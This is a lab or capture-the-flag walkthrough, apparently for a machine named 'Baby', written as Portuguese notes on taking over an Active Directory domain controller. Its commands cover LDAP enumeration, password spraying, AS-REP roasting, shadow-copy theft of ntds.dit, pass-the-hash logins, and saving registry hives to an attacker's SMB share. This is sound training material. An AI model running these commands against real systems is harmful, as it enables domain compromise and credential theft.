Baby
========================

## Enumeration

![qownnotes-media-CfVduq](../../../media/qownnotes-media-CfVduq.png)

![qownnotes-media-DbhlUL](../../../media/qownnotes-media-DbhlUL.png)

SMB

![qownnotes-media-tDhTDj](../../../media/qownnotes-media-tDhTDj.png)

    crackmapexec smb baby.vl -u usernames.txt -p passwords.txt --shares --continue --no-bruteforce

![qownnotes-media-pfvbMV](../../../media/qownnotes-media-pfvbMV.png)

    crackmapexec smb baby.vl -u usernames.txt -p 'BabyStart123!' --shares --continue --no-bruteforce

![qownnotes-media-wezqbz](../../../media/qownnotes-media-wezqbz.png)

    impacket-smbpasswd baby.vl/Caroline.Robinson@babydc.baby.vl -newpass 'P@ssw0rd!'

![qownnotes-media-nhVTnV](../../../media/qownnotes-media-nhVTnV.png)

Caroline.Robinson:P@ssw0rd!

    crackmapexec smb baby.vl -u Caroline.Robinson -p 'P@ssw0rd!' --shares
    
    crackmapexec winrm baby.vl -u Caroline.Robinson -p 'P@ssw0rd!'

![qownnotes-media-FFOtcJ](../../../media/qownnotes-media-FFOtcJ.png)

CONSEGUIMOS SHELL

Kerberos

![qownnotes-media-oFnWQn](../../../media/qownnotes-media-oFnWQn.png)

    impacket-GetNPUsers -request -usersfile usernames.txt baby.vl/ -dc-ip 10.10.96.83

![qownnotes-media-bsjTBa](../../../media/qownnotes-media-bsjTBa.png)

DNS

![qownnotes-media-iljQQe](../../../media/qownnotes-media-iljQQe.png)

LDAP

    ldapsearch -x -H ldap://baby.vl -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName

    ldapsearch -x -H ldap://baby.vl -D '' -w '' -b "DC=baby,DC=vl" | grep userPrincipalName
    
![qownnotes-media-Ugemmm](../../../media/qownnotes-media-Ugemmm.png)

![qownnotes-media-jUfwzb](../../../media/qownnotes-media-jUfwzb.png)

Agora que notei a senha "BabyStart123!"

Caroline.Robinson:BabyStart123!

    cat usernames.txt > passwords.txt
    cat usernames.txt | tr '[:upper:]' '[:lower:]' >> passwords.txt

## PrivEsc


    whoami /priv

![qownnotes-media-viPDya](../../../media/qownnotes-media-viPDya.png)

    cat test.dsh 

```
set context persistent nowriters
add volume c: alias test
create
expose %test% z:
```

    unix2dos test.dsh

Depois disso, fazer o upload desse arquivo para a máquina alvo:

    mkdir c:\temp
    cd c:\temp
    upload test.dsh
    diskshadow /s test.dsh
    robocopy /b z:\windows\ntds . ntds.dit
    download ntds.dit

Depois de baixar o arquivo para a máquina do atacante, basta executarmos o impacket-secretsdump

    impacket-secretsdump -ntds ntds.dit -system system local

![qownnotes-media-UUMZHP](../../../media/qownnotes-media-UUMZHP.png)

    crackmapexec winrm baby.vl -u Administrator -H "ee4457ae59f1e3fbd764e33d9cef123d"
 
![qownnotes-media-SrXcsj](../../../media/qownnotes-media-SrXcsj.png)

    evil-winrm -i baby.vl -u Administrator -H "ee4457ae59f1e3fbd764e33d9cef123d"

![qownnotes-media-AizZrF](../../../media/qownnotes-media-AizZrF.png)

## ADD

Vale considerar que o que foi feito de maneira local não funcionou...

    reg save HKLM\SYSTEM \\10.8.1.121\smb\system
    reg save HKLM\SAM \\10.8.1.121\smb\sam
    
    impacket-secretsdump -sam sam -system system local
 
 ![qownnotes-media-SQJbKk](../../../media/qownnotes-media-SQJbKk.png)
 
 ![qownnotes-media-QWpHBK](../../../media/qownnotes-media-QWpHBK.png)